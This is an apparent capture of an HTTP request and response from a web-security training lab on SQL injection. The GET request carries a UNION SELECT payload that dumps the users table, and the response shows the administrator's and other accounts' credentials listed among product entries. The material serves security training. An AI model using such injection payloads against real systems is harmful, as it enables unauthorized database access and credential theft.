@@ -1,0 +1,129 @@
+GET https://0a7700030379adc880f96c87007c00fd.web-security-academy.net/filter?category=Accessories%27%20union%20select%20username_tvbmjd,password_eqlcqx%20from%20users_fdgmys-- HTTP/1.1
+host: 0a7700030379adc880f96c87007c00fd.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+content-length: 0
+Cookie: session=Dz07IhPDSXFMnYPtJOIpODG8Ilf831y3
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 8575
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
+        <title>SQL injection attack, listing the database contents on non-Oracle databases</title>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                            <h2>SQL injection attack, listing the database contents on non-Oracle databases</h2>
+                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
+                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle'>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-notsolved'>
+                            <span>LAB</span>
+                            <p>Not solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <div theme="ecommerce">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                            <a href="/my-account">My account</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <section class="ecoms-pageheader">
+                        <img src="/resources/images/shop.svg">
+                    </section>
+                    <section class="ecoms-pageheader">
+                        <h1>Accessories&apos; union select username_tvbmjd,password_eqlcqx from users_fdgmys--</h1>
+                    </section>
+                    <section class="search-filters">
+                        <label>Refine your search:</label>
+                        <a class="filter-category" href="/">All</a>
+                        <a class="filter-category" href="/filter?category=Accessories">Accessories</a>
+                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
+                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
+                        <a class="filter-category" href="/filter?category=Tech+gifts">Tech gifts</a>
+                        <a class="filter-category" href="/filter?category=Toys+%26+Games">Toys & Games</a>
+                    </section>
+                    <table class="is-table-longdescription">
+                        <tbody>
+                        <tr>
+                            <th>administrator</th>
+                            <td>t3xwaocgwjjd2t470vnr</td>
+                        </tr>
+                        <tr>
+                            <th>wiener</th>
+                            <td>g8my13k7ihnf0wx4omq4</td>
+                        </tr>
+                        <tr>
+                            <th>Giant Pillow Thing</th>
+                            <td>Giant Pillow Thing - Because, why not?
+Have you ever been sat at home or in the office and thought, I&apos;d much rather sit in something that a team of Gurkha guides couldn&apos;t find me in? Well, look no further than this enormous, luxury pillow. It&apos;s ideal for car parks, open air fields, unused basements and big living rooms. Simply drag it in with your team of weight lifters and hide from your loved ones for days. This is the perfect product to lounge in comfort in front of the TV on, have a family reunion in, or land on after jumping out of a plane.</td>
+                        </tr>
+                        <tr>
+                            <th>carlos</th>
+                            <td>nf47i92zky7qma5t5edz</td>
+                        </tr>
+                        <tr>
+                            <th>Cheshire Cat Grin</th>
+                            <td>We&apos;ve all been there, found ourselves in a situation where we find it hard to look interested in what our colleagues, bosses, friends, and family are saying. With our smile insert, you can now fake it like a pro. Easy to use and completely hypoallergenic with one size fits all.
+Ever glazed over as your pals regale you with tales of their day on the golf course with the boss? This is the product for you. Not only will you appear fully engaged and happy in their company, but you will also be the object of everyone&apos;s eye as they fawn over your bright, white Cheshire Cat Grin.
+No need to spill the beans on this one, this insert is available by invitation only and is protected by the rules of the magician&apos;s code. In order to maintain the ruse we will regularly enhance this product by changing the size and shape of the teeth, but always guarantee a huge smile to be proud of.
+For those of you unlucky enough to have lost the essential front smiling teeth we can make smiles to order. Grab yourself some poster putty, bite down on it and we&apos;ll do the rest. Say &apos;yes&apos; to success today and keep those crashing bores as happy as you look.</td>
+                        </tr>
+                        <tr>
+                            <th>ZZZZZZ Bed - Your New Home Office</th>
+                            <td>We are delighted to introduce you to our new, state of the art, home office. ZZZZZZ Bed is a revolutionary space-saving concept for those of you struggling to fit everything into your tiny home. But it&apos;s not just about its useful integration in your existing room, it&apos;s also about the convenience it offers in your work and leisure time.
+Picture this, you are halfway through your working day and it&apos;s time for a well-earned nap. You will be able to save time by moving your work to one side, as you lie back and drift off without interrupting the natural flow of the day. When you&apos;ve had your power nap, and are ready to get back to it everything is there waiting for you.
+Nothing can offer you a work-life balance like the ZZZZZZ bed can. Sleep in comfort when you need to, whatever time of day it is. Wake up and work any time sleep is getting the better of you, your office will always be at your fingertips. Call us today for a free quote and to discuss any of our innovative add-ons you will wonder how you ever lived without</td>
+                        </tr>
+                        <tr>
+                            <th>Six Pack Beer Belt</th>
+                            <td>The Six Pack Beer Belt - because who wants just one beer?
+Say goodbye to long queues at the bar thanks to this handy belt. This beer belt is fully adjustable up to 50&apos; waist, meaning you can change the size according to how much beer you&apos;re drinking. With its camouflage design, it&apos;s easy to sneak beer into gigs, parties and festivals. This is the perfect gift for a beer lover or just someone who hates paying for drinks at the bar!
+Simply strap it on and load it up with your favourite beer cans or bottles and you&apos;re off! Thanks to this sturdy design, you&apos;ll always be able to boast about having a six pack. Buy this adjustable belt today and never go thirsty again!</td>
+                        </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+            <div class="footer-wrapper">
+            </div>
+        </div>
+    </body>
+</html>
